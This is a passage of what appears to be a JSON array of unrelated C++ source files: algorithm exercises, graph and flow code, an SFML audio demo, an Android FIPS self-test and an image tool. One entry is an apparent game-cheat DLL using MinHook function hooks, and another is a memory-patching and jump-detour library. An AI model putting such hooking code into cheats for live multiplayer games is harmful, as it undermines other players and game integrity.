\u0440\u0443\u0448\u0438\u043b\u0438 \u043d\u0430\r\n\u0443\u0440\u043e\u0447\u0438\u0441\u0442\u0435 \u0437\u0430\u043a\u0440\u0438\u0442\u0442\u044f \u0437\u043c\u0456\u043d\u0438. \u041a\u043e\u043b\u0438 \u043e\u0431\u0438\u0434\u0432\u0456 \u043a\u043e\u043b\u043e\u043d\u0438 \u0434\u0456\u0441\u0442\u0430\u043b\u0438\u0441\u044f \u043c\u0456\u0441\u0446\u044f \u043f\u0440\u043e\u0432\u0435\u0434\u0435\u043d\u043d\u044f \u0437\u0430\u0445\u043e\u0434\u0443,\r\n\u0437\u2019\u044f\u0441\u0443\u0432\u0430\u043b\u043e\u0441\u044f, \u0449\u043e \u0432 \u043e\u0434\u043d\u043e\u043c\u0443 \u0437 \u0442\u0430\u0431\u043e\u0440\u0456\u0432 \u0443\u0447\u043d\u0456 \u0432\u0438\u0448\u0438\u043a\u0443\u0432\u0430\u043b\u0438\u0441\u044f \u0437\u0430 \u043d\u0435\u0441\u043f\u0430\u0434\u0430\u043d\u043d\u044f\u043c \u0437\u0440\u043e\u0441\u0442\u0443, \u0430 \u0432\r\n\u0456\u043d\u0448\u043e\u043c\u0443 \u2013 \u0437\u0430 \u043d\u0435\u0437\u0440\u043e\u0441\u0442\u0430\u043d\u043d\u044f\u043c. \u0414\u043b\u044f \u043e\u0440\u0433\u0430\u043d\u0456\u0437\u0430\u0442\u043e\u0440\u0456\u0432 \u0437\u0430\u0445\u043e\u0434\u0443 \u043f\u043e\u0442\u0440\u0456\u0431\u043d\u043e \u0431\u0443\u043b\u043e, \u0449\u043e\u0431 \u0434\u0456\u0442\u0438 \u0441\u0442\u043e\u044f\u043b\u0438\r\n\u043e\u0434\u043d\u0456\u0454\u044e \u043a\u043e\u043b\u043e\u043d\u043e\u044e, \u0443\u043f\u043e\u0440\u044f\u0434\u043a\u043e\u0432\u0430\u043d\u043e\u044e \u0437\u0430 \u0437\u0440\u043e\u0441\u0442\u043e\u043c \u043f\u043e \u043d\u0435\u0441\u043f\u0430\u0434\u0430\u043d\u043d\u044e. \u0414\u043e\u043f\u043e\u043c\u043e\u0436\u0456\u0442\u044c \u0457\u043c \u0432\u0438\u0437\u043d\u0430\u0447\u0438\u0442\u0438,\r\n\u0432 \u044f\u043a\u0456\u0439 \u043f\u043e\u0441\u043b\u0456\u0434\u043e\u0432\u043d\u043e\u0441\u0442\u0456 \u0432\u043e\u043d\u0438 \u043f\u043e\u0432\u0438\u043d\u043d\u0456 \u0441\u0442\u043e\u044f\u0442\u0438.*/\r\n\r\n\r\n#include <iostream>\r\n#include <bits/stdc++.h>\r\nusing namespace std;\r\n\r\n\r\nvoid in_mas(int mas[], int N){\r\n    for (int i = 0; i < N; i++){\r\n        cin >> mas[i];\r\n    }\r\n}\r\n\r\nvoid out_mas(int mas[], int N){\r\n    for (int i = 0; i < N; i++){\r\n        cout << mas[i] << \" \";\r\n    }\r\n    cout << '\\n';\r\n}\r\n\r\nint res[2000005];\r\nint mas1[1000005];\r\nint mas2[1000005];\r\nint main()\r\n{\r\n    int N1, p1=0, N2, p2, pans = 0;\r\n    cin >> N1; \r\n    in_mas(mas1, N1);\r\n    cin >> N2; \r\n    in_mas(mas2, N2);\r\n    p2=N2-1;\r\n    while(p2>-1 || p1 < N1){\r\n        if(p1 < N1 && p2 > -1){\r\n            if(mas1[p1] < mas2[p2]){\r\n                res[pans] = mas1[p1];\r\n                p1++;\r\n                pans++;\r\n            }\r\n            else\r\n            {\r\n                res[pans] = mas2[p2];\r\n                p2--;\r\n                pans++;\r\n            } \r\n        }\r\n        else if(p1>=N1)\r\n        {\r\n            res[pans] = mas2[p2];\r\n            p2--;\r\n            pans++;\r\n        }\r\n        else \r\n        {\r\n            res[pans] = mas1[p1];\r\n            p1++;\r\n            pans++;\r\n        }\r\n    }\r\n    out_mas(res, N1+N2);\r\n    return 0;\r\n}",
    "#include <iostream>\r\n#include <queue>\r\n\r\nusing namespace std;\r\n\r\nconst int MAX_VERTICES = 100; // Maximum number of vertices\r\n\r\nclass Graph\r\n{\r\nprivate:\r\n    int vertices;\r\n    int adjacencyMatrix[MAX_VERTICES][MAX_VERTICES];\r\n\r\npublic:\r\n    Graph(int vertices);\r\n    void addEdge(int from, int to);\r\n    void breadthFirstTraversal(int startVertex);\r\n};\r\n\r\nGraph::Graph(int vertices)\r\n{\r\n    this->vertices = vertices;\r\n    // Initialize adjacency matrix with 0s\r\n    for (int i = 0; i < vertices; ++i)\r\n    {\r\n        for (int j = 0; j < vertices; ++j)\r\n        {\r\n            adjacencyMatrix[i][j] = 0;\r\n        }\r\n    }\r\n}\r\n\r\nvoid Graph::addEdge(int from, int to)\r\n{\r\n    adjacencyMatrix[from][to] = 1;\r\n    adjacencyMatrix[to][from] = 1; // For undirected graph\r\n}\r\n\r\nvoid Graph::breadthFirstTraversal(int startVertex)\r\n{\r\n    bool visited[MAX_VERTICES] = {false};\r\n    queue<int> queue;\r\n\r\n    visited[startVertex] = true;\r\n    queue.push(startVertex);\r\n\r\n    while (!queue.empty())\r\n    {\r\n        int currentVertex = queue.front();\r\n        cout << currentVertex << \" \";\r\n        queue.pop();\r\n\r\n        for (int i = 0; i < vertices; ++i)\r\n        {\r\n            if (adjacencyMatrix[currentVertex][i] && !visited[i])\r\n            {\r\n                visited[i] = true;\r\n                queue.push(i);\r\n            }\r\n        }\r\n    }\r\n}\r\n\r\nint main()\r\n{\r\n    Graph graph(6); // Create a graph with 6 vertices\r\n    graph.addEdge(0, 1);\r\n    graph.addEdge(0, 2);\r\n    graph.addEdge(1, 3);\r\n    graph.addEdge(1, 4);\r\n    graph.addEdge(2, 4);\r\n    graph.addEdge(3, 4);\r\n    graph.addEdge(3, 5);\r\n    graph.addEdge(4, 5);\r\n\r\n    cout << \"Breadth-First Traversal starting from vertex 0: \";\r\n    graph.breadthFirstTraversal(0);\r\n\r\n    return 0;\r\n}\r\n",
    "\n////////////////////////////////////////////////////////////\n// Headers\n////////////////////////////////////////////////////////////\n#include <SFML/Audio.hpp>\n#include <iostream>\n#include <string>\n\n\n////////////////////////////////////////////////////////////\n/// Play a sound\n///\n////////////////////////////////////////////////////////////\nvoid playSound()\n{\n    // Load a sound buffer from a wav file\n    sf::SoundBuffer buffer;\n    if (!buffer.loadFromFile(\"resources/canary.wav\"))\n        return;\n\n    // Display sound informations\n    std::cout << \"canary.wav:\" << std::endl;\n    std::cout << \" \" << buffer.getDuration().asSeconds() << \" seconds\"       << std::endl;\n    std::cout << \" \" << buffer.getSampleRate()           << \" samples / sec\" << std::endl;\n    std::cout << \" \" << buffer.getChannelCount()         << \" channels\"      << std::endl;\n\n    // Create a sound instance and play it\n    sf::Sound sound(buffer);\n    sound.play();\n\n    // Loop while the sound is playing\n    while (sound.getStatus() == sf::Sound::Playing)\n    {\n        // Leave some CPU time for other processes\n        sf::sleep(sf::milliseconds(100));\n\n        // Display the playing position\n        std::cout << \"\\rPlaying... \" << sound.getPlayingOffset().asSeconds() << \" sec        \";\n        std::cout << std::flush;\n    }\n    std::cout << std::endl << std::endl;\n}\n\n\n////////////////////////////////////////////////////////////\n/// Play a music\n///\n////////////////////////////////////////////////////////////\nvoid playMusic(const std::string& filename)\n{\n    // Load an ogg music file\n    sf::Music music;\n    if (!music.openFromFile(\"resources/\" + filename))\n        return;\n\n    // Display music informations\n    std::cout << filename << \":\" << std::endl;\n    std::cout << \" \" << music.getDuration().asSeconds() << \" seconds\"       << std::endl;\n    std::cout << \" \" << music.getSampleRate()           << \" samples / sec\" << std::endl;\n    std::cout << \" \" << music.getChannelCount()         << \" channels\"      << std::endl;\n\n    // Play it\n    music.play();\n\n    // Loop while the music is playing\n    while (music.getStatus() == sf::Music::Playing)\n    {\n        // Leave some CPU time for other processes\n        sf::sleep(sf::milliseconds(100));\n\n        // Display the playing position\n        std::cout << \"\\rPlaying... \" << music.getPlayingOffset().asSeconds() << \" sec        \";\n        std::cout << std::flush;\n    }\n    std::cout << std::endl << std::endl;\n}\n\n\n////////////////////////////////////////////////////////////\n/// Entry point of application\n///\n/// \\return Application exit code\n///\n////////////////////////////////////////////////////////////\nint main()\n{\n    // Play a sound\n    playSound();\n\n    // Play music from an ogg file\n    playMusic(\"orchestral.ogg\");\n\n    // Play music from a flac file\n    playMusic(\"ding.flac\");\n\n    // Wait until the user presses 'enter' key\n    std::cout << \"Press enter to exit...\" << std::endl;\n    std::cin.ignore(10000, '\\n');\n\n    return EXIT_SUCCESS;\n}\n",
    "/*\n * Copyright (C) 2019 The Android Open Source Project\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\n#include <openssl/crypto.h>\n\n// This program is run early during boot and if it exits with a\n// failure status then the device will reboot to the bootloader.\n// See init.rc for details.\n// It may also exit before reaching main() if BoringSSL fast tests fail.\nint main(int, char**) {\n    if (!FIPS_mode()) {\n        return 1;  // Fail: BoringSSL not built in FIPS mode.\n    }\n    if (!BORINGSSL_self_test()) {\n        return 1;  // Fail: One or more self tests failed.\n    }\n    return 0;      // Success\n}\n",
    "#include \"Constants.h\"\n#include \"GeneratedCode.h\"\n#include \"Hooks.h\"\n#include \"Menu.h\"\n\nvoid Hooks::InitHooks() {\n\tMH_STATUS MhStats = MH_Initialize();\n\tif (MhStats != MH_OK)\n\t{\n\t\tstd::cerr << \"[Error] Failed To Initialize MinHook : \" << MH_StatusToString(MhStats) << \"\\t\\tExiting...\\n\";\n\t\tSleep(1000);\n\t\tMH_DisableHook(MH_ALL_HOOKS);\n\t\tMH_Uninitialize();\n\t\tFreeConsole();\n\t\tFreeLibraryAndExitThread(Constants::DllHandle, 0);\n\t}\n}\n\n//SwapBuffers\nHooks::SwapBuffersT Hooks::SwapBuffersO;\nuintptr_t* Hooks::SwapBuffersTar;\n\n//WndProc\nLONG_PTR Hooks::WndProcOState;\n\n//ClipCursor\nHooks::ClipCursorT Hooks::ClipCursorO;\nuintptr_t* Hooks::ClipCursorTar;\n\n////TraceShoot\n//Hooks::TraceShootWrapperT Hooks::TraceShootWrapperO;\n//uintptr_t* Hooks::TraceShootWrapperTar;\n////TraceLine\n//Hooks::TraceLineT Hooks::TraceLineO;\n//uintptr_t* Hooks::TraceLineTar;\n\n\n\n//TODO :FIX (SHOOTS EVERY PLAYER)\n//bool IsFirst = true;\n//std::thread th;\n//void ChangeState() {\n//\tstd::this_thread::sleep_for(std::chrono::seconds(3));\n//\tIsFirst = false;\n//\tCoolDown = false;\n//}\n//int __cdecl Hooks::TraceShootWrapperH(int* a, float* b, int c, float* d, int* e, char f){//Who Is shooting?\n//\n//\t//printf(\"CALLED\\n\\n\");\n//\tif (a != (int*)LocalPlayer && !*PRealLocalMode && !LocalPlayer->PlayerMode && *PRealHealth > 0 && !CoolDown)\n//\t{\n//\t\tPlayerEnt* Attacker = (PlayerEnt*)a;\n//\t\tAttackerName = Attacker->Name;\n//\n//\t\tCoolDown = true;\n//\t\tif(IsFirst)\n//\t\t\tth = std::thread(ChangeState);\n//\t\telse {\n//\t\t\tth.join();\n//\t\t\tth = std::thread(ChangeState);\n//\t\t}\n//\n//\t\treturn TraceShootWrapperO(a, b, c, d, e, f);\n//\n//\t}\n//\n//\t////return Attacked;\n//}\n\n\n",
    "/*************************************************\r\n Image Object\r\n \r\n   The image object represents an in-memory\r\n   (mipmapped) image. It also provides functions\r\n   for loading and saving itself to/from disk.\r\n   It also contains functions for displaying\r\n   the image under Windows.\r\n\r\n  To Do\r\n  \r\n    * Do horizontal and vertical flipping in\r\n      a single pass\r\n\r\n\r\n**************************************************/\r\n\r\n#ifdef _WINDOWS\r\n    #include <windows.h>\r\n    #include <commctrl.h>\r\n    #include \"WinPVR/resource.h\"\r\n    #include \"WinPVR/WinUtil.h\"\r\n#endif\r\n\r\n#include <memory.h>\r\n#include <stdlib.h>\r\n#include <string.h>\r\n#include <stdio.h>\r\n#include \"minmax.h\"\r\n#include \"Image.h\"\r\n#include \"Picture.h\"\r\n#include \"Util.h\"\r\n#include \"Resample.h\"\r\n\r\nextern const char* g_pszSupportedFormats[];\r\n\r\n\r\n#ifdef _WINDOWS\r\n//////////////////////////////////////////////////////////////////////\r\n// Message processing function for the save options dialog\r\n//////////////////////////////////////////////////////////////////////\r\nBOOL CALLBACK DlgProc_SaveOptions( HWND hDlg, UINT uMsg, WPARAM wParam, LPARAM lParam )\r\n{\r\n    static SaveOptions* s_pSaveOption = NULL;\r\n    switch( uMsg )\r\n    {\r\n        case WM_INITDIALOG:\r\n        {\r\n            //center the window over it's parent\r\n            CenterWindow( hDlg, GetParent(hDlg) );\r\n\r\n            //initialise controls\r\n            s_pSaveOption = (SaveOptions*)lParam; \r\n            SendDlgItemMessage( hDlg, IDC_COLOURFORMAT, CB_ADDSTRING, 0, (LPARAM)\"Smart\" );\r\n            SendDlgItemMessage( hDlg, IDC_COLOURFORMAT, CB_ADDSTRING, 0, (LPARAM)\"565\" );\r\n            SendDlgItemMessage( hDlg, IDC_COLOURFORMAT, CB_ADDSTRING, 0, (LPARAM)\"555\" );\r\n            SendDlgItemMessage( hDlg, IDC_COLOURFORMAT, CB_ADDSTRING, 0, (LPARAM)\"1555\" );\r\n            SendDlgItemMessage( hDlg, IDC_COLOURFORMAT, CB_ADDSTRING, 0, (LPARAM)\"4444\" );\r\n            SendDlgItemMessage( hDlg, IDC_COLOURFORMAT, CB_ADDSTRING, 0, (LPARAM)\"Smart YUV\" );\r\n            SendDlgItemMessage( hDlg, IDC_COLOURFORMAT, CB_ADDSTRING, 0, (LPARAM)\"YUV\" );\r\n            SendDlgItemMessage( hDlg, IDC_COLOURFORMAT, CB_ADDSTRING, 0, (LPARAM)\"8888 (palette)\" );\r\n            SendDlgItemMessage( hDlg, IDC_COLOURFORMAT, CB_SETCURSEL, 0, 0 );\r\n\r\n            SendDlgItemMessage( hDlg, IDC_PALETTEDEPTH, CB_ADDSTRING, 0, (LPARAM)\"no palette\" );\r\n            SendDlgItemMessage( hDlg, IDC_PALETTEDEPTH, CB_ADDSTRING, 0, (LPARAM)\"4 bpp\" );\r\n            SendDlgItemMessage( hDlg, IDC_PALETTEDEPTH, CB_ADDSTRING, 0, (LPARAM)\"8 bpp\" );\r\n\r\n            //build INI file name\r\n            char szINIFile[MAX_PATH+1];\r\n            GetModuleFileName( NULL, szINIFile, MAX_PATH );\r\n            ChangeFileExtension( szINIFile, \"INI\" );\r\n\r\n            //load last used settings\r\n            int iSel = GetPrivateProfileInt( \"Save\",     \"ColourFormat\", 0, szINIFile );\r\n            int bTwiddle = GetPrivateProfileInt( \"Save\", \"Twiddle\",      1, szINIFile );\r\n            int bMipMap = GetPrivateProfileInt( \"Save\",  \"MipMap\",       0, szINIFile );\r\n            int bPad = GetPrivateProfileInt( \"Save\",     \"Pad\",          0, szINIFile );\r\n            int iPalette = 0;\r\n            if( s_pSaveOption->nPaletteDepth )\r\n            {\r\n                iPalette = s_pSaveOption->nPaletteDepth == 4 ? 1 : 2;\r\n            }\r\n            iPalette = GetPrivateProfileInt( \"Save\", \"Palette\",  iPalette, szINIFile );\r\n\r\n            //plug these into the dialog\r\n            SendDlgItemMessage( hDlg, IDC_COLOURFORMAT, CB_SETCURSEL, iSel, 0 );\r\n            CheckDlgButton( hDlg, IDC_TWIDDLE, bTwiddle ? BST_CHECKED : BST_UNCHECKED );\r\n            CheckDlgButton( hDlg, IDC_MIPMAPS, bMipMap ? BST_CHECKED : BST_UNCHECKED );\r\n            CheckDlgButton( hDlg, IDC_PAD, bPad ? BST_CHECKED : BST_UNCHECKED );\r\n            if( s_pSaveOption->nPaletteDepth )\r\n            {\r\n                SendDlgItemMessage( hDlg, IDC_PALETTEDEPTH, CB_SETCURSEL, 0, iPalette );\r\n            }\r\n            else\r\n            {\r\n                SendDlgItemMessage( hDlg, IDC_PALETTEDEPTH, CB_SETCURSEL, 0, 0 );\r\n                EnableWindow( GetDlgItem( hDlg, IDC_PALETTEDEPTH ), FALSE );\r\n            }\r\n            break;\r\n        }\r\n            \r\n        case WM_CLOSE:\r\n            EndDialog( hDlg, IDCANCEL );\r\n            break;\r\n\r\n        case WM_COMMAND:\r\n            switch( LOWORD(wParam) )\r\n            {\r\n                case IDOK:\r\n                {\r\n                    //extract options\r\n                    s_pSaveOption->bMipmaps = ( IsDlgButtonChecked( hDlg, IDC_MIPMAPS ) == BST_CHECKED );\r\n                    s_pSaveOption->bTwiddled = ( IsDlgButtonChecked( hDlg, IDC_TWIDDLE ) == BST_CHECKED );\r\n                    s_pSaveOption->bPad = ( IsDlgButtonChecked( hDlg, IDC_PAD ) == BST_CHECKED );\r\n                    BOOL bPal = FALSE;\r\n                    if( s_pSaveOption->nPaletteDepth )\r\n                    {\r\n                        bPal = TRUE;\r\n                        switch( SendDlgItemMessage( hDlg,",
    "/*\nMIT License\n\nCopyright (c) 2024\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE.\n*/\n\n#include \"GP4MemLib.h\"\n#include <iomanip>\n#include <sstream>\n#include <windows.h>\n\nnamespace GP4MemLib {\n\n\tstd::string MemUtils::dwordToString(DWORD address) {\n\n\t\tstd::ostringstream outputString;\n\n\t\toutputString.str(std::string());\n\t\toutputString << \"0x\" << std::hex << std::setw(sizeof(DWORD) * 2) << std::setfill('0') << address;\n\n\t\treturn outputString.str();\n\n\t}\n\n\tstd::string MemUtils::ptrToString(LPVOID address) {\n\n\t\treturn dwordToString(PtrToUlong(address));\n\t}\n\n\tvoid MemUtils::patchAddress(LPVOID address, LPBYTE patch, SIZE_T size) {\n\t\tDWORD oldProtect;\n\n\t\tstd::string addressString = ptrToString(address);\n\n\t\tif (VirtualProtect(address, size, PAGE_EXECUTE_READWRITE, &oldProtect)) {\n\n\t\t\tmemcpy(address, patch, size);\n\t\t\tVirtualProtect(address, size, oldProtect, &oldProtect);\n\n\t\t\tOutputDebugStringA((\"Memory patched successfully at address \" + addressString + \"\\n\").c_str());\n\t\t}\n\t\telse {\n\t\t\tOutputDebugStringA((\"Error while patching address \" + addressString + \"\\n\").c_str());\n\t\t}\n\t}\n\n\tvoid MemUtils::rerouteFunction(DWORD jumpToAddress, DWORD targetFunction, std::string functionName)\n\t{\n\t\tBYTE jmpCode[5] = { 0xe9, 0x0, 0x0, 0x0, 0x0 };\n\n\t\t// Offset to jump into the re-routed function\n\t\tDWORD jumpOffset = targetFunction - jumpToAddress - 5;\n\n\t\t// Append the jump offset to the jmp asm instruction code\n\t\tmemcpy(&jmpCode[1], &jumpOffset, sizeof(DWORD));\n\n\t\tOutputDebugStringA((\"Rerouting starting at address \" + dwordToString(jumpToAddress) + \"\\n\").c_str());\n\n\t\tif (functionName == \"\")\n\t\t\tfunctionName = \"target function\";\n\n\t\tOutputDebugStringA((\"Address of \" + functionName + \": \" + dwordToString(targetFunction) + \"\\n\").c_str());\n\n\t\t// Patch memory to jump\n\t\tpatchAddress((LPVOID)jumpToAddress, (LPBYTE)&jmpCode, sizeof(jmpCode));\n\n\t}\n\n\t// Definition of static variables in the RegUtils class\n\tDWORD RegUtils::eaxVar = 0;\n\tDWORD RegUtils::ecxVar = 0;\n\tDWORD RegUtils::edxVar = 0;\n\n\t// Save the volatile CPU registers\n\t__declspec(naked) void RegUtils::saveVolatileRegisters() {\n\n\t\t__asm {\n\t\t\tmov eaxVar, EAX\n\t\t\tmov ecxVar, ECX\n\t\t\tmov edxVar, EDX\n\t\t\tret\n\t\t}\n\t}\n\n\t// Restore the volatile CPU registers\n\t__declspec(naked) void RegUtils::restoreVolatileRegisters() {\n\n\t\t__asm {\n\t\t\tmov EAX, eaxVar\n\t\t\tmov ECX, ecxVar\n\t\t\tmov EDX, edxVar\n\t\t\tret\n\t\t}\n\t}\n\n} // namespace GP4MemLib",
    "\r\n/* Allah is the best planner.He knows everything*/\r\n#include<bits/stdc++.h>\r\nusing namespace std;\r\n \r\n#define pb  push_back\r\n#define fast() ios_base::sync_with_stdio(false);cin.tie(NULL);cout.tie(NULL);\r\n#define en \"\\n\"\r\n\r\ntypedef long long int ll;\r\ntypedef unsigned long long int ull;\r\n  \r\nvoid solve()\r\n{\r\n  \r\n}\r\n  \r\nint main()\r\n{\r\nfast();\r\n \r\n int t=1; \r\n cin>>t;\r\nwhile(t--)\r\n{\r\n   int n;\r\n   cin>>n;\r\n   string str;\r\n   cin>>str;\r\n   int open=0;\r\n   string temp=\"\";\r\n   for(int i=0;i<n;i++) \r\n   {\r\n           if(str[i]=='(')\r\n           {\r\n            open++;\r\n           }\r\n           else if(str[i]==')')\r\n           {\r\n            open--;\r\n           }\r\n           else if(str[i]=='_'&&open==0)\r\n           {\r\n           str[i]='(';\r\n           open++;\r\n           }\r\n          else if(open>=1&&str[i]=='_')\r\n          {\r\n            str[i]=')';\r\n            open--;\r\n          }\r\n   }\r\n\r\n  // cout<<str<<en;\r\n  ll sum=0;\r\n  for(int i=0;i<n;i++)\r\n  {\r\n    int it=i+1;\r\n     if(str[i]=='(')\r\n     {\r\n      sum=sum-it;\r\n     }\r\n     else\r\n     {\r\n        sum=sum+it;\r\n     }\r\n  }\r\n  cout<<sum<<en;\r\n}\r\n   return 0;\r\n}",
    "#include <iostream>\n#include <vector>\n#include <string>\n#include <sstream>\n#include <unordered_map>\n#include <unordered_set>\n#include <set>\n#include <cassert>\n#include <algorithm>\n\nusing namespace std;\n\nvector<bool> Visited;\n\nclass DFA_Class {\npublic:\n    DFA_Class(int _statesNum, int _alphabetNum, set<int>& _FinalStates, vector<vector<int>> _delta) :\n        statesNum(_statesNum), alphabetNum(_alphabetNum), FinalStates(_FinalStates), delta(_delta) {\n    };\n    int statesNum;\n    int alphabetNum;\n    set<int> FinalStates;\n    vector<vector<int>> delta;\n};\n\nvoid dfs(vector<vector<pair<string, int>>>& DFA, int Current) {\n\n    //if (!DFS[Current].size())return Current;\n    for (int i = 0; i < DFA[Current].size(); i++)\n    {\n        Visited[Current] = true;\n        if (!Visited[DFA[Current][i].second]) {\n            dfs(DFA, DFA[Current][i].second);\n        }\n    }\n    //return -1;\n}\n\nint Del_dfs(vector<vector<int>>& delta, int Current) {\n    Visited[Current] = true;\n    if (!delta[Current].size())return Current;\n    for (int i = 0; i < delta[Current].size(); i++)\n    {\n        if (!Visited[delta[Current][i]]) {\n            Del_dfs(delta, delta[Current][i]);\n        }\n    }\n    return -1;\n}\n\nbool Equivalent(DFA_Class& dfa, int i, int j, vector<int>& partition_0) {\n    for (int z = 0; z < dfa.alphabetNum; z++) {\n        int dest_i = dfa.delta[i][z];\n        int dest_j = dfa.delta[j][z];\n        if (dest_i > 0 && dest_j > 0) {\n            if (partition_0[dest_i] != partition_0[dest_j]) return false;\n        }\n\n    }\n    return true;\n}\n\nvector<int> Minimize(DFA_Class& dfa) {\n    int statesNum = dfa.statesNum;\n\n    vector<int> partition_0(statesNum, -1);\n    for (int i : dfa.FinalStates) {\n        partition_0[i] = 1;\n    }\n\n    while (true) {\n        vector<int> partition(statesNum, -1);\n        int i = 0;\n        while (i < statesNum) {\n            partition[i] = i;\n            int i_next = statesNum;\n            for (int j = i + 1; j < statesNum; j++) {\n                if (partition[j] >= 0) continue;\n                if (partition_0[i] == partition_0[j] && Equivalent(dfa, i, j, partition_0)) {\n                    partition[j] = i;\n                }\n                else if (i_next == statesNum) {\n                    i_next = j;\n                }\n            }\n            i = i_next;\n        }\n        if (partition_0 == partition) break;\n        partition_0 = partition;\n    }\n\n    return partition_0;\n}\n\n\nint main() {\n    unordered_map<string, int> states;\n    vector<char> alphabet;\n    set<int> finalStateSet;\n    vector<vector<pair<string, int>>> DFA;\n\n    int statesNum, alphabetNum, finalStateNum, transitionsNum, totalStatesNum;\n\n    cin >> statesNum;\n    for (int i = 0; i < statesNum; i++) {\n        string x;\n        cin >> x;\n        states[x] = i;\n    }\n    Visited.resize(statesNum, 0);\n    cin >> alphabetNum;\n    alphabet.resize(alphabetNum);\n    for (int i = 0; i < alphabetNum; i++) {\n        cin >> alphabet[i];\n    }\n\n    cin >> finalStateNum;\n    for (int i = 0; i < finalStateNum; i++) {\n        string x;\n        cin >> x;\n        finalStateSet.insert(states[x]);\n    }\n\n    cin >> transitionsNum;\n    DFA.resize(statesNum);\n    for (int i = 0; i < transitionsNum; i++) {\n        string str;\n        cin >> str;\n        vector<string> v;\n        stringstream ss(str);\n        while (ss.good()) {\n            string substr;\n            getline(ss, substr, ',');\n            v.push_back(substr);\n        }\n        DFA[states[v[0]]].push_back({ v[1], states[v[2]] });\n    }\n    //int idx = -1;\n    /*if (idx >= 0) {\n        DFA.erase(DFA.begin() + idx);\n    }*/\n    totalStatesNum = statesNum;\n    dfs(DFA, 0);\n    for (int i = 0; i < Visited.size(); i++)\n    {\n        if (!Visited[i]) {\n            for (int h = 0; h < alphabetNum; h++) {\n                DFA[i][h] = { {alphabet[h]}, -1 };\n            }\n            /*for (int k = i + 1; k < statesNum; k++)\n            {\n                for (int m = 0; m < DFA[k].size(); m++)\n                {\n                    if (DFA[k][m].second > i)DFA[k][m].second--;\n                }\n            }*/\n\n\n            /*auto it = finalStateSet.find(i);\n            if (it != finalStateSet.end()) {\n                finalStateSet.erase(it, finalStateSet.end());\n            }*/\n            totalStatesNum--;\n\n        }\n    }\n    Visited.assign(statesNum, 0);\n\n    vector<vector<int>> delta(statesNum, vector<int>(alphabetNum, -1));\n    for (int i = 0; i < statesNum; i++) {\n        for (auto& transition : DFA[i]) {\n            int inputIndex = find(alphabet.begin(), alphabet.end(), transition.first[0]) - alphabet.begin();\n            delta[i][inputIndex] = transition.second;\n        }\n    }\n    /*int idx2 = 0;\n    for (int i = 0; i < statesNum; i++)\n    {\n        if (!Visited[i]) {\n            idx2 = Del_dfs(delta, i);\n        }\n    }\n    if (idx2 >= 0) {\n        delta.erase(delta.begin() + idx2);\n    }*/\n    DFA_Class dfa(statesNum, alphabetNum, finalStateSet, delta);\n    auto minimizedPartition",
    "/*https://www.geeksforgeeks.org/ford-fulkerson-algorithm-for-maximum-flow-problem/\n\n C++ program for implementation of Ford Fulkerson algorithm\n*/\n#include <iostream>\n#include <limits.h>\n#include <queue>\n#include <string.h>\nusing namespace std;\n\n// Number of vertices in given graph\n#define V 6\n\n/* Returns true if there is a path from source 's' to sink\n't' in residual graph. Also fills parent[] to store the\npath */\nbool bfs(int rGraph[V][V], int s, int t, int parent[])\n{\n\t// Create a visited array and mark all vertices as not\n\t// visited\n\tbool visited[V];\n\tmemset(visited, 0, sizeof(visited));\n\n\t// Create a queue, enqueue source vertex and mark source\n\t// vertex as visited\n\tqueue<int> q;\n\tq.push(s);\n\tvisited[s] = true;\n\tparent[s] = -1;\n\n\t// Standard BFS Loop\n\twhile (!q.empty()) {\n\t\tint u = q.front();\n\t\tq.pop();\n\n\t\tfor (int v = 0; v < V; v++) {\n\t\t\tif (visited[v] == false && rGraph[u][v] > 0) {\n\t\t\t\t// If we find a connection to the sink node,\n\t\t\t\t// then there is no point in BFS anymore We\n\t\t\t\t// just have to set its parent and can return\n\t\t\t\t// true\n\t\t\t\tif (v == t) {\n\t\t\t\t\tparent[v] = u;\n\t\t\t\t\treturn true;\n\t\t\t\t}\n\t\t\t\tq.push(v);\n\t\t\t\tparent[v] = u;\n\t\t\t\tvisited[v] = true;\n\t\t\t}\n\t\t}\n\t}\n\n\t// We didn't reach sink in BFS starting from source, so\n\t// return false\n\treturn false;\n}\n\n// Returns the maximum flow from s to t in the given graph\nint fordFulkerson(int graph[V][V], int s, int t)\n{\n\tint u, v;\n\n\t// Create a residual graph and fill the residual graph\n\t// with given capacities in the original graph as\n\t// residual capacities in residual graph\n\tint rGraph[V]\n\t\t\t[V]; // Residual graph where rGraph[i][j]\n\t\t\t\t// indicates residual capacity of edge\n\t\t\t\t// from i to j (if there is an edge. If\n\t\t\t\t// rGraph[i][j] is 0, then there is not)\n\tfor (u = 0; u < V; u++)\n\t\tfor (v = 0; v < V; v++)\n\t\t\trGraph[u][v] = graph[u][v];\n\n\tint parent[V]; // This array is filled by BFS and to\n\t\t\t\t// store path\n\n\tint max_flow = 0; // There is no flow initially\n\n\t// Augment the flow while there is path from source to\n\t// sink\n\twhile (bfs(rGraph, s, t, parent)) {\n\t\t// Find minimum residual capacity of the edges along\n\t\t// the path filled by BFS. Or we can say find the\n\t\t// maximum flow through the path found.\n\t\tint path_flow = INT_MAX;\n\t\tfor (v = t; v != s; v = parent[v]) {\n\t\t\tu = parent[v];\n\t\t\tpath_flow = 